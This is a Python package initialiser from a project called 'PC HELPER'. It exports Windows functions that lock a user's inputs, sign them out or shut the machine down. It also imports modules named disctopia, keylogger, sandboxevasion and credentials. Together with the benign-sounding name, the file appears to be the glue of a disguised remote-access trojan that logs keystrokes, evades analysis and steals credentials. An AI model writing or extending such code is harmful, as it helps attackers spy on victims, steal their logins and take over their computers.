# PC HELPER/libraries/__init__.py

# Import Windows features
from .windows_features import WindowsFeatures

# Create instance
windows_features = WindowsFeatures()

# Export Windows functions directly
def lock_inputs():
    return windows_features.lock_inputs()

def unlock_inputs():
    return windows_features.unlock_inputs()

def sign_out():
    return windows_features.sign_out()

def restart(timeout=30):
    return windows_features.restart(timeout)

def shutdown(timeout=30):
    return windows_features.shutdown(timeout)

def cancel_shutdown():
    return windows_features.cancel_shutdown()

# Import your existing modules - NO CHANGES to your main.py!
from . import disctopia
from . import keylogger
from . import sandboxevasion
from . import credentials